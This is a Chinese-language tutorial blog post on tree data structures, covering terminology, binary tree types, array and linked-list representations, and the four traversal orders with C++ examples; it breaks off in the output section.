        <content type="html"><![CDATA[<!-- Roadmap: (Tree 介紹) -> (Binary Tree介紹) -> (Binary Tree 與 Binary Search Tree 差異) -> (Tree的走訪) -> (建立Binary Tree)  --><h1 id="甚麼是-Tree"><a href="#甚麼是-Tree" class="headerlink" title="甚麼是 Tree?"></a>甚麼是 Tree?</h1><p><img src="/img/LeetCode/tree/tree.png"></p><p>Tree 是一種常見的資料結構，直觀上來看樹狀結構代表階層式結構，像是族譜或是不同語言，語系的直系表就很常用樹來表示。</p><h2 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h2><ul><li><strong>節點(Node)</strong>: 樹的基本單位</li><li><strong>根(Root)</strong>: 樹狀結構的初始節點</li><li><strong>分支(Branch)</strong>: 節點與節點之間的分支</li><li><strong>子節點(child)</strong>: Root以外的節點</li><li><strong>葉子節點(leaf)</strong>: 沒有連接到其他子節點的節點，即樹狀結構的末端節點</li></ul><h2 id="樹的定義"><a href="#樹的定義" class="headerlink" title="樹的定義"></a>樹的定義</h2><p>Tree的定義: <strong>由一個或是數個節點組成的有限集合</strong> 並且</p><ul><li>存在一個特定節點為Root</li><li>其餘節點可以分割成 $n &gt;&#x3D; 0$ 個沒有交集的(disjoint)集合 $T_{1},T_{2},…,T_{n}$ 為此Root的子樹(subtree)</li></ul><blockquote><p>這是一個遞迴的定義，對於上面圖中的節點A(Root)，有兩個子樹，其樹根分別是節點B和節點C，<strong>樹中的每一個節點都是某個子樹的root</strong>，例如節點C 就包含了兩個子樹，它們的root分別是節點E 與節點F，而節點E與F為兩個沒有子樹的樹的樹根</p></blockquote><ul><li>A的子樹: $T_{1}(B,D)$, $T_{2}(C,E,F)$</li><li>B的子樹: $T_{1}(D)$</li><li>C的子樹: $T_{1}(E)$, $T_{2}(F)$</li></ul><h2 id="Tree的特性"><a href="#Tree的特性" class="headerlink" title="Tree的特性"></a>Tree的特性</h2><!-- 這段感覺可以改成用圖表示，比較不冗 --><ul><li><strong>分支度(Degree)為一個節點子樹數量</strong>，以上圖為例，不同節點的degree分別為:<ul><li>A 的 degree&#x3D;2</li><li>B 的 degree&#x3D;1</li><li>C 的 degree&#x3D;2</li></ul></li><li><strong>Leaf of the tree</strong><ul><li>這棵樹的leaf分別為 D, E, F</li></ul></li><li><strong>childs of the tree</strong><ul><li>B,C 為 A的 child node</li><li>D 為 B 的 child node</li><li>E, F 為 C 的 child node</li></ul></li><li><strong>Parents of the tree</strong><ul><li>A 為 B,C 的 parent node</li><li>B 為 D 的 parent node</li><li>C 為 E, F 的 parent node</li></ul></li><li><strong>Siblings of the tree</strong><ul><li>B,C 彼此為 sliblings</li><li>E 與 F 彼此為 sliblings</li><li>其實想成家系表或族譜就好理解了</li></ul></li><li><strong>Descendant nodes of the tree: 代表某個節點棋子樹的所有節點</strong><ul><li>A 的 descendant nodes 即為整棵樹的所有節點</li><li>C 的 descendant ndoes 就是 E 根 F，如果E跟F底下長出新的節點，也會是C的 descendant node</li></ul></li><li><strong>Level of the tree: 樹的level由root開始定義，root level 為level1</strong><ul><li>A: Level 1</li><li>B, C: Level 2</li><li>D,E,F: Level 3</li></ul></li><li><strong>Depth: 某個node到root的level差距</strong><ul><li>BC 的 Depth 為 1</li><li>D,E,F 的　Depth 為 2</li></ul></li></ul><h2 id="樹的優缺點"><a href="#樹的優缺點" class="headerlink" title="樹的優缺點"></a>樹的優缺點</h2><p>這裡可以統整之前學習的資料結構的優缺點</p><table><thead><tr><th>結構</th><th>優點</th><th>缺點</th></tr></thead><tbody><tr><td>陣列</td><td>存取速度快</td><td>插入刪除元素效率低</td></tr><tr><td>鏈結串列</td><td>插入刪除等操作效率高</td><td>存取特定節點值效率低，會需要遍歷list</td></tr></tbody></table><p>而Tree結構能增加儲存、讀取效率，Ex. Binary Sort Tree，既可以保證搜尋速度，同時也可以保證插入、刪除、修改的速度。</p><h2 id="Tree-的表示法"><a href="#Tree-的表示法" class="headerlink" title="Tree 的表示法"></a>Tree 的表示法</h2><p><img src="/img/LeetCode/tree/tree2.png"></p><p><strong>左子-右兄弟表示法(Left Child-Right Sibling Representation)</strong> 是一種表達樹結構的表示法，它的原則是<strong>每個節點至多只有一個左兒子，節點右邊至多也只有一個最近的兄弟</strong>，透過這種表示法可以把上面的樹畫成下面的樹</p><p><img src="/img/LeetCode/tree/LC-RS.png"></p><blockquote><p>這種表示法的好處在於，可以很輕易地得到分支度為2 (<code>dregee = 2</code>) 的樹，只要將 Left-child right sibling樹順時鐘旋轉45度即可</p></blockquote><p><img src="/img/LeetCode/tree/binary_tree.png"></p><div class="note info flat"><p>這個樹的Root的右兒子是空的，這是一定的，因為轉換前的樹跟也必定不會有sibling</p></div><blockquote><p><strong>而上面這種分支度至多為2的樹也就代表每個節點最多就是兩個子樹，這種樹又稱為二元樹(Binary Tree)</strong></p></blockquote><h1 id="Binary-Tree"><a href="#Binary-Tree" class="headerlink" title="Binary Tree"></a>Binary Tree</h1><p>Binary tree 與 Tree是兩回事，一棵 binary tree 的定義如下：</p><blockquote><p>為節點組成的有限集合 (可以是空集合)，每個節點至多有兩個 subTree，左子樹以及有右子樹是有順序的 (不像 Tree 的左右是無序的)</p></blockquote><p>從定義上就可以看出 Binary Tree 與 Tree 之間的差異，Tree不可為空，而Binary Tree可以是空的，Binary Tree在意左右subTree的順序，但Tree並不在意順序。</p><h2 id="Binary-Tree-種類"><a href="#Binary-Tree-種類" class="headerlink" title="Binary Tree 種類"></a>Binary Tree 種類</h2><h3 id="Skewed-Tree"><a href="#Skewed-Tree" class="headerlink" title="Skewed Tree"></a>Skewed Tree</h3><ul><li>Left skewed tree: 所有的 node 都只有 left subTree<br><img src="/img/LeetCode/tree/ls_tree.png"></li><li>Right skewed tree: 所有的 node 都只有 right subTree<br><img src="/img/LeetCode/tree/rs_tree.png"></li></ul><h3 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h3><ul><li>除了 leaf以外，所有節點都有兩個child，<strong>也就是每個節點都存在left和right subTree</strong></li><li>所有的 leaf node 都在同一個 level</li><li>各層節點不一定全滿<br><img src="/img/LeetCode/tree/new_full_btr.png"></li></ul><h3 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h3><ul><li>各層全滿的 Full Binary Tree<br><img src="/img/LeetCode/tree/full_btr.png"></li></ul><h3 id="Complete-BinaryTree"><a href="#Complete-BinaryTree" class="headerlink" title="Complete BinaryTree"></a>Complete BinaryTree</h3><p>對一棵 binary tree 的 node 由上至下，由左至右編號，<strong>若其編號的 node 和 full binary tree 的 node 一模一樣，則可稱為 complete binary tree</strong></p><p><img src="/img/LeetCode/tree/complete_btr.png"><br>上圖編號節點與Full Binary Tree節點一致，因此為 Complete Binary Tree</p><p><img src="/img/LeetCode/tree/not_complete_btr.png"><br>上圖節點編號與Full Binary Tree節點編號不一致，因此不為 Complete Binary Tree</p><div class="note info flat"><p>Full &#x2F; perfect binary tree 為 complete binary tree，但 complete binary tree 不一定是 full &#x2F; perfect binary tree</p></div><blockquote><p>其實總結 Complete Binary Tree的特性其實就是各層節點全滿，除了最後一層，最後一層節點全部靠左</p></blockquote><h2 id="用-Linked-List-表示一個-Tree"><a href="#用-Linked-List-表示一個-Tree" class="headerlink" title="用 Linked List 表示一個 Tree"></a>用 Linked List 表示一個 Tree</h2><p>一個節點結構如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">Node* parent;</span><br><span class="line">Node* left;</span><br><span class="line">Node* right;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Node* root = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="用-Array-表示一個-Tree"><a href="#用-Array-表示一個-Tree" class="headerlink" title="用 Array 表示一個 Tree"></a>用 Array 表示一個 Tree</h2><p>根據<a href="https://web.ntnu.edu.tw/~algo/BinaryTree.html">這篇文章</a>，也可以透過陣列去實作一個Tree。</p><p>也就是以陣列編號來存取節點，並且以編號奇偶數來判斷左或是右子樹。建立一個陣列，以陣列索引值得到節點：樹根的索引值是一，索引值的兩倍是left child，索引值的兩倍再加一是right child，索引值除以二是parent。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> tree[<span class="number">1024</span>];<span class="comment">// tree[0] do nothing</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parent</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index / <span class="number">2</span>;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">left</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index * <span class="number">2</span>;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">right</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">binary_tree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Root: &quot;</span> &lt;&lt; tree[<span class="number">1</span>];</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The left child of the root: &quot;</span> &lt;&lt; tree[<span class="built_in">left</span>(<span class="number">1</span>)];</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The right child of the root: &quot;</span> &lt;&lt; tree[<span class="built_in">right</span>(<span class="number">1</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/tree/arrary_tree.png"></p><p>但這樣做的缺點也顯而易見，就是樹的大小是固定的，並且如果不是perfect binary tree的話，陣列中會有大量的空值，非常浪費記憶體空間。以陣列大小1024為例，樹的高度也僅為10  ($2^{10}$) </p><h1 id="Binary-Tree-Traversal"><a href="#Binary-Tree-Traversal" class="headerlink" title="Binary Tree Traversal"></a>Binary Tree Traversal</h1><blockquote><p>怎樣算是 Traversal?<br>取決於實作方式，如果是用 Linked List 實現的 Tree，位於 node(A) 可以藉由指向 node(B) 的pointer，由A往B進行移動，可被視為 traversal</p></blockquote><p><img src="/img/LeetCode/tree/traversal.png"></p><p>對於當前節點可以進行的操作:</p><ul><li>V: visting, 可以是印出節點資料之類的操作</li><li>L: 移動到 left child</li><li>R: 移動到 right child</li></ul><blockquote><p>如果現在當前節點是 A節點，加入一個限制  <strong>「L 一定在 R 之前」</strong>，則會產生三種 Traversal 方式: 前序遍歷(preorder traversal)、中序遍歷(inorder traversal)、後序遍歷(postorder traversal)、層序遍歷 (level-order traversal)</p></blockquote><p><img src="/img/LeetCode/tree/3traversal.png"></p><h2 id="Pre-Order-Traversal"><a href="#Pre-Order-Traversal" class="headerlink" title="Pre-Order Traversal"></a>Pre-Order Traversal</h2><p>遍歷順序會是: Root, Left subTree, Right subTree</p><p>可應用於 <strong>Depth-first Search (DFS)</strong></p><p><img src="/img/LeetCode/tree/preorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 VLR 的順序進行檢查，首先先 Visiting A節點(可能執行print節點值之類的操作)，接著檢查 left-child B(L)是否為 null，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope，之後拜訪 B，並接續檢查 left-child，並移動到 D(L)節點，並且Visiting D(L)，由於 D 節點是 Leaf (Left, Right Child 都是 null)，因此回到 B 作為 currentNode 並且拜訪其 right child E(R)，完成後以 B 為 currentNode 的 scope 所有節點拜訪完畢，回到 B的 Parent Node 作為 currenNode 的 scope，這裡也就是指 A(V)，並且接續拜訪其 right child，也就是 C(R)，visiting C完畢後拜訪其 left child，也就是 F(L)，拜訪完畢後，嘗試訪問C的Rigth Child 發現為null，所有結點拜訪完畢，完成本次 Traversal，印出  A B D E C F。</p><h2 id="In-Order-Traversal"><a href="#In-Order-Traversal" class="headerlink" title="In-Order Traversal"></a>In-Order Traversal</h2><p>遍歷順序會是: Left subTree, Root, Right subTree<br>實際上是採用depth-first search，只不過更動了節點的輸出順序。</p><p><img src="/img/LeetCode/tree/Inorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 LVR 的順序進行檢查，先檢查 Left-Child 也就是 B 是否為 NULL，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope 依序檢查其child，首先檢查 B的 Left-child，也就是 D 是否為NULL，若不是則將 CurrentNode 移動到 D(L)，接著就是以 D作為 currentNode 再做一次 post-order 檢查，這時會發現 D的 Letf child 和 right child 都是 NULL，這時就回到 D本身做 visiting (可能是print出D的資料值等等行為)，當前 scope 中所有節點拜訪完畢，之後就要回到 D 的 Parent 來作為當前 CurrentNode 的 scope，currentNode 便移動回 B。接著拜訪 B 的 Right child 也就是 E(R)，拜訪完畢後，以 B 為 currentNode 的 scope 全部拜訪完畢，回到 B 的 parent 也就是 A(V) 進行 Visiting，之後移動到 C(R)，檢查當前 currentNode 的 Left child 也就是 F(L)，進行拜訪，結束後移動回 C(V) 進行拜訪，確認沒有 Right child 後，本次 Traversal 結束，印出 D B E A F C。</p><h2 id="Post-Order-Traversal"><a href="#Post-Order-Traversal" class="headerlink" title="Post-Order Traversal"></a>Post-Order Traversal</h2><p>遍歷順序會是: Left subTree, Right subTree, Root</p><p><img src="/img/LeetCode/tree/postorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 LRV 的順序進行檢查，先檢查 Left-Child 也就是 B 是否為 NULL，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope 依序檢查其child，首先檢查 B的 Left-child，也就是 D 是否為NULL，若不是則將 CurrentNode 移動到 D(L)，接著就是以 D作為 currentNode 再做一次 post-order 檢查，這時會發現 D的 Letf child 和 right child 都是 NULL，這時就回到 D本身做 visiting (可能是print出D的資料值等等行為)，當前 scope 中所有節點拜訪完畢，之後就要回到 D 的 Parent 來作為當前 CurrentNode 的 scope，currentNode 便移動回 B。</p><blockquote><p>回到 B 就代表 以 D 作為 CurrentNode 的迴圈或函式結束</p></blockquote><p>以 B 作為 CurrentNode，post-order 規則來看，目前 Left child 拜訪完畢，接著要拜訪 right child，所以往 E(R) 移動，但也由於 E 跟 D 一樣都是 Leaf，並不會朝 null 移動，因此回到 B(v) 節點進行visting，這樣就完成以 B 為 Scope 的所有 node 之 Visiting。之後回到 A(V)，以A作為 CurrentNode 進行檢查，這時要朝Right child，也就是 C(R) 移動，此時 currentNode 為 C(R)，按照post-order 進行檢查，發現 F 為 Leaf Node，就對 F 進行 Visiting，而之後可以發現 C 的 Right child 為 null，因此掠過 right child 回到 C(V)，對 C 進行 Visiting，之後 currentNode 再回到 A(V) 進行 Visiting，完成本次 Traversal，印出 D E B F C A。</p><h2 id="Level-order-Traversal"><a href="#Level-order-Traversal" class="headerlink" title="Level-order Traversal"></a>Level-order Traversal</h2><p>即為 <strong>breadth-first search(BFS)</strong> ，主要是按照 Level 大小順序由上而下，並且在相同 Level 由左至右依序 Visiting 每個節點</p><blockquote><p>通常會以 Queue 來去進行實作</p></blockquote><p><img src="/img/LeetCode/tree/levelorder_traversal.png"></p><p>輸出順序會是: A B C D E F G H I</p><h1 id="實作-Binary-Tree-的不同-Traversal"><a href="#實作-Binary-Tree-的不同-Traversal" class="headerlink" title="實作 Binary Tree 的不同 Traversal"></a>實作 Binary Tree 的不同 Traversal</h1><h2 id="暴力實作一個-Binary-Tree"><a href="#暴力實作一個-Binary-Tree" class="headerlink" title="暴力實作一個 Binary Tree"></a>暴力實作一個 Binary Tree</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *leftchild;</span><br><span class="line">        TreeNode *rightchild;</span><br><span class="line">        TreeNode *parent;</span><br><span class="line">        string str;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">TreeNode</span>(): <span class="built_in">leftchild</span>(<span class="number">0</span>), <span class="built_in">rightchild</span>(<span class="number">0</span>),<span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">str</span>(<span class="string">&quot;&quot;</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(string s): <span class="built_in">leftchild</span>(<span class="number">0</span>), <span class="built_in">rightchild</span>(<span class="number">0</span>), <span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">str</span>(s)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// the root is the starting node ot the tree</span></span><br><span class="line">        TreeNode *root; </span><br><span class="line">        <span class="built_in">BinaryTree</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode *node): <span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Preorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Postorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>main()</code> 中依序建立節點以及串連節點，形成一顆 Binary Tree</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// Instanitate  all tree nodes</span></span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    TreeNode *nodeB = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    TreeNode *nodeC = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">    TreeNode *nodeD = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">    TreeNode *nodeE = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    TreeNode *nodeF = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">    TreeNode *nodeG = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">    TreeNode *nodeH = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">    TreeNode *nodeI = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;I&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Construct a binary tree</span></span><br><span class="line">    nodeA -&gt; leftchild = nodeB;</span><br><span class="line">    nodeA -&gt; rightchild = nodeC;</span><br><span class="line">    nodeB -&gt; leftchild = nodeD;</span><br><span class="line">    nodeB -&gt; rightchild = nodeE;</span><br><span class="line">    nodeE -&gt; leftchild = nodeG;</span><br><span class="line">    nodeE -&gt; rightchild = nodeH;</span><br><span class="line">    nodeC -&gt; leftchild = nodeF;</span><br><span class="line">    nodeF -&gt; rightchild = nodeI;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Given a root node</span></span><br><span class="line">    <span class="function">BinaryTree <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Traversal</span></span><br><span class="line">    T.<span class="built_in">Preorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">Inorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">Postorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">Levelorder</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡建構出來的樹會長這個樣子</p><p><img src="/img/LeetCode/tree/BT.png"></p><p>接著定義 Traversal Methods，主要透過遞迴的方式來實踐，因為這樣可以在 child 拜訪結束後回到它的 parent</p><h2 id="Pre-Order"><a href="#Pre-Order" class="headerlink" title="Pre-Order"></a>Pre-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// V-&gt; L-&gt; R</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Preorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="comment">// visiting the current node</span></span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="comment">// if leftchild exists, moving currentNode to the left child</span></span><br><span class="line">        <span class="built_in">Preorder</span>(current-&gt;leftchild);</span><br><span class="line">        <span class="built_in">Preorder</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-Order"><a href="#In-Order" class="headerlink" title="In-Order"></a>In-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L -&gt; V -&gt; R</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="built_in">Inorder</span>(current-&gt;leftchild);</span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="built_in">Inorder</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Post-Order"><a href="#Post-Order" class="headerlink" title="Post-Order"></a>Post-Order</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L -&gt; R -&gt; V</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Postorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current)&#123;</span><br><span class="line">        <span class="built_in">Postorder</span>(current-&gt;leftchild);</span><br><span class="line">        <span class="built_in">Postorder</span>(current-&gt;rightchild);</span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Level-Order"><a href="#Level-Order" class="headerlink" title="Level-Order"></a>Level-Order</h2><p>Level-Order 的特性就是在相同 Level 由左至右存取，不同Level 由上而下存取，由於先存取得先拜訪，這種特性與Queue相似，因此選擇 Queue 來實作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Using Queue</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Levelorder</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="keyword">this</span>-&gt;root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span> ;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;leftchild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;rightchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定義一個 Queue，並且將 root 節點推進queue，而開始走訪時，將 current 定義為Queue 的front，並在 Queue 中移除該節點，接著印出當前節點值，之後先檢查left child，如果不為NULL，則 push 到 queue 中，而相同LEVEL中，檢查right child 是否為空，如果不為空一樣push 進 queue 中，接著由於 Queue 不為空，因此這時的 front 會是剛剛的left child，此時將 current 更新為 front，並且印出其值，接著檢查是否左右子樹為空，不為空就push 進 queue。下一次跌代就是處理剛剛推進 queue 的 right child，一樣印出其值，並檢查其後代是否為空，不為空就push進queue，這樣第二層 Level 的拜訪就完成了，後面就對下一層level (現在 Queue 中元素)做處理。</p><h2 id="輸出結果"><a href="#輸出結果" class="headerlink" title="輸出結果"></a>輸出結果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 